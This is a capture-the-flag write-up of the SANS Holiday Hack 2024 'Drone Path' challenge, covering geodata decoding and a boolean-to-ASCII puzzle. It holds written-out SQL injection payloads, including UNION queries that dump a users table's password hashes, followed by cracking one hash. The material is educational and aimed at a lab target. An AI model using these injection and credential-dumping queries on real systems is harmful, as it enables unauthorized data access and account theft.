+++
author = "Maik de Kruif"
title = "Drone Path"
subtitle = "Act 2 - SANS Holiday Hack Challenge 2024"
date = 2025-01-01T15:23:55+01:00
description = "In Drone Path, we help Chimney Scissorsticks decode drone data to avert an elf conflict. For silver, we analyze a KML file, geolocate a hidden drone name, and plot CSV data to uncover a password. For gold, we exploit an SQL injection flaw to find clues on how to reveal the gold medal code, and decode some binary data. Along the way, we explore database schemas and crack passwords for deeper insights!"
cover = "img/writeups/holiday-hack-challenge/2024/act2/drone-path/cover.png"
tags = [
    "Holiday Hack Challenge",
    "ctf",
    "hacking",
    "writeup",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

## Link

If you want to play the challenge yourself, you can find it here:

<https://2024.holidayhackchallenge.com/>

## Story line

Let's start off by talking to the elf:

> Hey. Psst, over here. Hey, I'm Chimney Scissorsticks.
>
> I'm not liking all the tension brewing between the factions, so even though I agreed with how Wombley was handling things, I get the feeling this is going to end poorly for everyone. So I'm trying to get this data to Alabaster's side. Can you help?
>
> Wombley's planning something BIG in that toy factory. He's not really making toys in there. He's building an armada of drones!
>
> They're packed with valuable data from the elves working on the project. I think they hide the admin password in the drone flight logs. We need to crack this to prevent this escalating snowball showdown.
>
> You'll be working with KML files, tracking drone flight paths. Intriguing, right? We need every detail to prepare for what’s ahead!
>
> Use tools like Google Earth and some Python scripting to decode the hidden passwords and codewords locked in those files.
>
> Ready to give it a go? It’s going to be a wild ride, and your skills might just turn the tide of this conflict!

## Hints

There are no hints available.

## Recon

Upon opening the challenge, we're greeted with a website. From the navigation bar we can see there are three public pages, Home, FileShare and Login.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/landing-page.png" title="Home page" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/file-share-page.png" title="FileShare page" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/login-page.png" title="Login page" >}}

On the FileShare page there is a downloading link for [fritjolf-Path.kml](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/fritjolf-Path.kml). [KML](https://en.wikipedia.org/wiki/Keyhole_Markup_Language) is a file format for storing geolocation data.

<!-- [fritjolf-Path.kml](https://hhc24-dronepath.holidayhackchallenge.com/files/fritjolf-Path.kml) -->
<!-- [fritjolf-Path.kml](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/fritjolf-Path.kml) -->

## Silver

Let's start by taking a look at the KML file. Many applications can open it, but I used [Google Earth](https://earth.google.com/web/). In Google Earth you can import KML files under File > Open local KML file.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/google-earth-open-kml.png" title="Open KML file in Google Earth" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/google-earth-path.png" title="Path in Google Earth" >}}

Once the image it loaded, Google Earth will automatically zoom to it. We'll then be able to see a word; "GUMDROP1". This looks like it might be some kind of password. We'll also need a username, which we don't have yet. We can try "fritjolf" though, as it is in the filename.

Hurray, those credentials worked! We now got access to a few more pages; Workshop, Profile and Admin Console.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/workshop-page.png" title="Workshop page" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/profile-page.png" title="Profile page" >}}
{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/admin-console-page.png" title="Admin Console page" >}}

We once again find a reference to a file; [Preparations-drone-name.csv](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/Preparations-drone-name.csv). It is a CSV file containing 8 different geo locations. At first I didn't look at them, and went straight to exploiting the drone search page (more on that later). This wasn't needed though, and I later learned from a friend that you could get a drone name from the CSV file. to stick with the intended path, that's the route we'll take here.

<!-- [Preparations-drone-name.csv](https://hhc24-dronepath.holidayhackchallenge.com/files/secret/Preparations-drone-name.csv) -->
<!-- [Preparations-drone-name.csv](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/Preparations-drone-name.csv) -->

It we lookup the coordinates on Google Maps we'll find nothing special, just some locations in Australia. But if we switch to satellite view, it get's interesting. It turns out all locations refer to a letter.

| Pos | Latitude           | Longitude         | Link                                                                                   | Letter |
| --- | ------------------ | ----------------- | -------------------------------------------------------------------------------------- | ------ |
| 1   | -37.42277804382341 | 144.8567879816271 | [Google Maps](https://www.google.com/maps/@-37.42277804382341,144.8567879816271,1200m) | E      |
| 2   | -38.0569169391843  | 142.4357677725014 | [Google Maps](https://www.google.com/maps/@-38.0569169391843,142.4357677725014,600m)   | L      |
| 3   | -37.80217469906655 | 143.9329094555584 | [Google Maps](https://www.google.com/maps/@-37.80217469906655,143.9329094555584,600m)  | F      |
| 4   | -38.0682499155867  | 142.2754454646221 | [Google Maps](https://www.google.com/maps/@-38.0682499155867,142.2754454646221,600m)   | -      |
| 5   | -34.52324587244343 | 141.756352258091  | [Google Maps](https://www.google.com/maps/@-34.52324587244343,141.756352258091,3000m)  | H      |
| 6   | -36.74357572393437 | 145.513859306511  | [Google Maps](https://www.google.com/maps/@-36.74357572393437,145.513859306511,1400m)  | A      |
| 7   | -37.89721189352699 | 144.745994150535  | [Google Maps](https://www.google.com/maps/@-37.89721189352699,144.745994150535,180m)   | W      |
| 8   | -37.00702150480869 | 145.8966329539992 | [Google Maps](https://www.google.com/maps/@-37.00702150480869,145.8966329539992,1200m) | K      |

In the end they form "ELF-HAWK", let's try looking that up on the Workshop page.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/elf-hawk-info.png" title="Search for ELF-HAWK" >}}

Now we can see some drone details as well as some comments. In the comments we find yet another file, [ELF-HAWK-dump.csv](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/ELF-HAWK-dump.csv), and some hints referring to the latitude and longitude.

<!-- [ELF-HAWK-dump.csv](https://hhc24-dronepath.holidayhackchallenge.com/files/secret/ELF-HAWK-dump.csv) -->
<!-- [ELF-HAWK-dump.csv](/files/writeups/holiday-hack-challenge/2024/act2/drone-path/ELF-HAWK-dump.csv) -->

Because there are over 3,000 records, we can't look up the locations manually this time. If we look at the values, we'll also find that the longitude values go up to over 1,500 which is weird since the values should only go from -180 to 180 degrees.

Maybe we can draw the locations on a plane using some code. I choose to use Python because of it's ecosystem and ability to prototype quickly. In Python, we can use the `pandas` library to load big data files, and `matplotlib` to plot locations on a figure.

Here's the script I used.

```py
import matplotlib.pyplot as plt
import pandas as pd

df = pd.read_csv("ELF-HAWK-dump.csv")

fig = plt.figure(figsize=(18, 4))  # use figsize to make the figure wider
ax1 = fig.add_subplot(111)
ax1.plot(df["OSD.longitude"], df["OSD.latitude"])
fig.savefig("plot.png")
```

{{< figure src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/silver-plot.png" title="Plot of locations" >}}

It seems the path once again describes a word, this time "DroneDataAnalystExpertMedal". We can enter this code on the Admin Console page to get the silver medal.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/silver-code-submitted.png" title="Submitted code for silver medal" >}}

## Gold

### Continued story line

Let's first talk to the elf again, he'll tell us what we'll have to do for gold.

> Bravo! You've tackled the drone challenge and navigated through those KML files like a true expert. Your skills are just what we need to prevent the big snowball battle—the North Pole thanks you!
>
> Well done! You cracked the code from the drones and showed you've mastered the basics of KML files. This kind of expertise will be invaluable as we gear up for what’s ahead!
>
> But I need you to dig deeper. Make sure you’re checking those file structures carefully, and remember—rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!

### Exploration

Okay, so the elf hints at some injection vulnerability. I already hinted in the silver part of the writeup that I found this on the Workshop page.

It's usually a good practice to keep the DevTools open while to trying to exploit a webpage. It will show the which requests are being sent, and, in this case more importantly, will show you if a request fails.

If we navigate back to the Workshop page and enter a quote (`'`) in the input field, we'll find that a request is being sent to `/drones?drone=%27`. More importantly, we'll also find that the request fails with a 500 Internal Server Error. This hints at some SQL injection vulnerability.

A common input when suspecting SQL injection is `' OR 1=1 --`. To explain why, we'll have to imagine what the code behind the form looks like. It might be something like the following.

```js
db.runQuery("SELECT * FROM drones WHERE name = '" + user_input + "' LIMIT 1");
```

This is vulnerable to SQL injection, because the user input is directly inserted into the query. In this case we can just add a quote into the input to modify the query itself. If we in this case submit `' OR 1=1 --` as the user input, the resulting query will look like this:

```sql
SELECT * FROM drones WHERE name = '' OR 1=1 -- ' LIMIT 1"
```

Since we added the `1=1` check all rows will match, and by adding `--` to the end, we're making sure all other checks coming after are ignored.

Enough lessons for now, let's get back to the page. Submitting the input will give us four drones.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/sql-injection.png" title="SQL Injection on drone page" >}}

Unfortunately, the page will only show the comments for one drone. In the DevTools however, we can see that requests were made for all four drones. They are as follows.

```json
{
    "comments": [
        "These drones will work great to find Alabasters snowball warehouses.\n I have hid the activation code in the dataset <a href='../files/secret/ELF-HAWK-dump.csv'>ELF-HAWK-dump.csv</a>. We need to keep it safe, for now it's under /files/secret.",
        "We need to make sure we have enough of these drones ready for the upcoming operation. \n Well done on hiding the activation code in the dataset.\n If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER."
    ],
    "drone_name": "ELF-HAWK"
}
```

```json
{
    "comments": [
        "This is a great drone for surveillance, but we need to keep it out of the rain.",
        "I cant believe we are using pigeons for surveillance. \n If anyone finds out, there will most likely be a conspiracy theory about it.",
        "I heard a rumor that there is something fishing with some of the files. \nThere was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it."
    ],
    "drone_name": "Pigeon-Lookalike-v4"
}
```

```json
{
    "comments": [
        "This drone is perfect for dropping snowballs on unsuspecting targets."
    ],
    "drone_name": "FlyingZoomer"
}
```

```json
{
    "comments": ["This is sort of primitive, but it works!"],
    "drone_name": "Zapper"
}
```

The comments for "Pigeon-Lookalike-v4" give us a hint, TRUE and FALSE are capitalized, likely referring to the many boolean values in `ELF-HAWK-dump.csv`.

### Solving

I spent quite some time going down several rabbit roles, one of which I'll go into as a bonus, but in the end it turned out we already have all we need.

First, if we take a good look at the csv file, we'll find that there is a newline missing on the first line. After all the headers we can also already find values. We can fix this by just adding a newline there. This doesn't get us much further, but at least the format is now correct.

Then, we can try turning the boolean values into binary. If we load the csv again using `pandas`, and take all the columns with the `bool` type, we can concatenate the values into one large string.

```py
import pandas as pd

df = pd.read_csv("ELF-HAWK-dump.csv")

boolean_columns = df.select_dtypes(include=["bool"])

binary = "".join(
    "1" if value else "0"
    for row in boolean_columns.T.to_dict().values()
    for value in row.values()
)
print(binary[:100])  # print only the first 100 characters
```

```txt
0011101000111010001110100011101000111010001110100011101000111010001110100011101000111010001110100011
```

It looks like the output is repeating itself here, but if we print the full binary, that actually changes. Converting `00111010` into a character will yield `:`, so there are a lot of those in the binary. This made me think of ASCII art, that usually has a lot of repeated characters, of which `:` is a common one.

Let's try turning the binary into characters. We can do this by splitting the binary every eight characters, creating a byte. We can then convert these bytes to characters by loading them as an integer first.

```py
print("".join(chr(int(binary[i : i + 8], 2)) for i in range(0, len(binary), 8)))
```

{{< collapsible-block title="ASCII art output" isCollapsed="true" >}}

<!-- prettier-ignore-start -->
```txt
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*::::::::::::::::::
:::::::::::::::::::::::::::::::-------------=--------::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::------------------------===-=======--=-::::::::::-:::::::::::::::::
::::::::::::::::::::------------:------------=-====================---:::::::::=+::::::::
:::::::::::::::::------------------------------=====================-------::::::::::::::
::::::::::::::-------------------------------------================:------:::::::::::::::
::::::::::::--------------------------------------==============-::--------:::::::::-::::
::::::::::::-------:--------@+:::::::::--=@--------:===========-::-::----==---:::::::::::
::::-------:::::----------@---::::::---+-==+@--------=========-:--:------=====---::::::::
::::--------::::::-------#--------------=-+@------------===------::-----====--==---::::::
::::-------:-:::::::------@=@=++#+++++@@@@@=-----------------:::--------------==---::::::
::::----------::::=-#-:----**%@+++++++%@@=::::::---%@------:--------:--@-+::-------::::::
::::-----:----:::::::::::--::@@**%@--::::::::::::::--=+@------------@--:::::------@::::::
::::---+@::::::---+@:::::::::#@-@--:::::-:=*=-::-----=+*=*=--------@:--:::::::-----=:::::
::::@-:::-::::::-----=@:-:::@+@%---------------==-==+@@@@@=@------@---------:::::--==+%::
:::#:::::::::::-----=+*@:::%#@#-=---------===++*%@@+@=+*#-+*=@-----#====-----------**-%::
::@--::-:::--:---==++*@-:@=+@=+-@=*+++++++**@#%*@-##**-@##%=#%@@@@#*@###@=+**@*****@@@:::
:::@*=--++++++++**@@@@@@*#@-+%@*=*+****@@@+@***@%@@%%%@-%@*@@@@@@@@@@@@@@%%#%%%@@@@@%::::
:::@@@@@@@++#*####@@@@@@@==---====+##@*%=+@*@*%%@@@@@@@@@@@@@@@=--@+@@@@+@@@@@@@@@@-:::::
::::=*%%%%%%%%%%%@@%@@#@-#*+++++====@-++###@%@*@@@@+@@@@-**+--::::--@@%@%%@%%%%%@@@-:::::
::::---@@@@##@@@@@@@@@--+@%-#+#**+=+++**%@@@@@@@##%**%--:::::::--*----=*@@@@@@@*@@---::::
::::---@@***%%%%@@@@*@-=-+=@#=#%##***##@@@@@#@@*@%%==---:::::::::::----=+---------=--::::
::::----@+=%#@@@=@@-----##@+:-=%@@%##%@@@@@@@@@@@@*+=-----::::::::::::=+*-@:----===--::::
::::---------------------*@##=+@@%@==-+@@@@@@@@@@@-+=---------------===+**--=======-:::::
:::---------------:------%+#%@@@@@#%%%%@@@@#@@@@@@@-+======---------==***#@========-:::::
:::-%-%---------:---------*-*##%@@@@@@@@@@@@@@@@@--=@@-*===++++++++++***@*===++++++=-::::
:::--+---------=-------:-----#==#@%%%@@@@@*@%@@@----@+@@@=***@@@@***@@@@%===++++-++=-::::
:::--------------:::::--------------##-----@@--------@%@#@@%%%%@@@@@@#@=====+++++++=-::::
:::---------------::::::---------------------=====---@@##@@@@@@@@@@@#%#-=====+++++--:::::
:::---======-------------------------=----==========--*=@@%@++*@@%%%@@-======:----==-::::
:::---===============------------------===============-----#@@@@@-----===-::---=====-::::
:::--=============+===--------------===-==================--------======::----=======-:::
:::--================---::::-=======-======================+=====+====::------===+===-:::
:::--===================--:::::====================+====-:---==+++=::-----=======---=-:::
:::--========:===========------:=====================:::-----====:-----==========+===-:::
 / ___/ _ \|  _ \| ____\ \      / / _ \|  _ \|  _ \   _____  ====:-----==========+===-:::
| |  | | | | | | |  _|  \ \ /\ / / | | | |_) | | | | |_____| ====:-----==========+===-:::
| |__| |_| | |_| | |___  \ V  V /| |_| |  _ <| |_| | |_____| ====:-----==========+===-:::
 \____\___/|____/|_____|__\_/\_/__\___/|_| \_\____/  _  _________   ______    _    ____  
| ____\ \/ /  _ \| ____|  _ \_   _|_   _| | | |  _ \| |/ / ____\ \ / / ___|  / \  |  _ \ 
|  _|  \  /| |_) |  _| | |_) || |   | | | | | | |_) | ' /|  _|  \ V / |     / _ \ | |_) |
| |___ /  \|  __/| |___|  _ < | |   | | | |_| |  _ <| . \| |___  | || |___ / ___ \|  _ < 
|_____/_/\_\_| __|_____|_|_\_\|_| __|_|  \___/|_| \_\_|\_\_____| |_| \____/_/   \_\_| \_\
\ \   / / ____|  _ \|  \/  | ____|  _ \  / \  | |    ==========---======++++=+=--+++=-:::
 \ \ / /|  _| | |_) | |\/| |  _| | | | |/ _ \ | |    ==========---======++++=+=--+++=-:::
  \ V / | |___|  _ <| |  | | |___| |_| / ___ \| |___ ==========---======++++=+=--+++=-:::
   \_/  |_____|_| \_\_|  |_|_____|____/_/   \_\_____|==========---======++++=+=--+++=-:::
::::--====+++=---++++++=+========------::::=-:---==============---======++++=+=--+++=-:::
::::--==+++++++==---+++++++++++========-----================++++==-========-++=++====-:::
:::::--====+++++-++--++++++++++=--------=-==============+++---------=====++=+++++::::::::
::::::::======+++=+++=+++++++++++++++=++++===========++++:-------=---=-=----:::::::::::::
::::::::::::::::--=-=======++=++++++++++++++============--------------:::::::::::::::::::
:::::::::::::::::::::::::::------===-==-===-==-----::-:::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
```
<!-- prettier-ignore-end -->

{{< /collapsible-block >}}

Woo-hoo! That looks like some readable text. Near the bottom we can find another code, `EXPERTTURKEYCARVERMEDAL`, which we can submit to the Admin Console again.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/drone-path/gold-code-submitted.png" title="Submitted code for gold medal" >}}

## Final elf message

> Absolutely fantastic! I think you found the most difficult path in, from file carving to SQL injection. Not many can do that, but you've shown you’re ready for anything the factions throw your way!

## Bonus

Before coming to the conclusion that the booleans were just binary, I looked deep into the SQL injection part. We can actually find some fun stuff in there.

To find things other then drones, we'll have to adapt our input a little. We can use a UNION query for example, this allows us to add data from other tables, as long the the amount of columns for the output is equal.

We can find some general information about the database by checking the version for example. For this we can use `' UNION SELECT 1, 1, sqlite_version() --` as the input, which will return the following json.

```json
[{ "name": 1, "quantity": 1, "weapons": "3.40.1" }]
```

Now that we've confirmed that sqlite is being used, and found which version is running, we can use internal tables to find more info. To get the table schemas for instance, we can query the `sqlite_master` table using `'UNION SELECT sql,1,1 FROM sqlite_master--`.

```json
[
    {
        "name": null,
        "quantity": 1,
        "weapons": 1
    },
    {
        "name": "CREATE TABLE drone_comments(id INTEGER PRIMARY KEY AUTOINCREMENT, drone_name TEXT, comment TEXT, FOREIGN KEY(drone_name) REFERENCES drones(name))",
        "quantity": 1,
        "weapons": 1
    },
    {
        "name": "CREATE TABLE drones(name TEXT PRIMARY KEY, quantitiy TEXT, weapons TEXT)",
        "quantity": 1,
        "weapons": 1
    },
    {
        "name": "CREATE TABLE sqlite_sequence(name,seq)",
        "quantity": 1,
        "weapons": 1
    },
    {
        "name": "CREATE TABLE users(username TEXT PRIMARY KEY, avatar TEXT, bio TEXT, password TEXT)",
        "quantity": 1,
        "weapons": 1
    }
]
```

We can now also query which users exists, and get their (hashed) passwords using `'UNION SELECT username,bio,password FROM users--`. The password hashes in the database look like MD5 hashes, so we could likely crack a few using [`john`](https://www.openwall.com/john/) or [`hashcat`](https://hashcat.net/hashcat/).

There are also some website using massive pre-computed lookup tables, one of which is [CrackStation](https://crackstation.net/). If we lookup the hashes there, we find that the user "pip" is using "RumbleInTheJungle" as their password.
